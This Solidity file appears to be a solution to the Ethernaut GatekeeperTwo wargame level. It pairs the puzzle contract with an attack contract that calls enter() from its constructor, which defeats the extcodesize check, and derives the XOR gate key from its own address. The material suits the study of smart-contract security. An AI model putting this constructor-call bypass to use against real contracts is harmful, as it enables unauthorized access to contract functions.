// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract AtGatekeeper {
    bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this)))))  ^ type(uint64).max);
    constructor() {
        GatekeeperTwo two = GatekeeperTwo(0xddaAd340b0f1Ef65169Ae5E41A8b10776a75482d);
        two.enter(gateKey);
    }
    function anyfunc()public {}
    function anyfunc2()public {}
}
